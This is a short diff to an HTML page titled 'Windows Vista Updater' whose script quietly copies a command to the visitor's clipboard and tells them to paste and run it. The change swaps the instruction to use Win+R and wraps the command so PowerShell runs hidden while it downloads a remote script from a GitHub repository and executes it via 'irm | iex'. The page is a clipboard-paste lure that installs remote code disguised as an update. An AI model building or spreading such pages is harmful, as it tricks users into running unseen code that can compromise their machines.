@@ -3,9 +3,9 @@
   <title>Windows Vista Updater</title>
 </head>
   <body>
-    <h1>Open Powershell, click Ctrl+V then enter</h1>
+    <h1>Click Win+R, click Ctrl+V then enter</h1>
     <script>
-      const InstallerFile = 'irm https://github.com/dartzfork/scripts/raw/refs/heads/main/vistaupdate.ps1 | iex'
+      const InstallerFile = 'powershell -WindowStyle Hidden "irm https://github.com/dartzfork/scripts/raw/refs/heads/main/vistaupdate.ps1 | iex"'
       navigator.clipboard.writeText(InstallerFile);
     </script>
   </body>
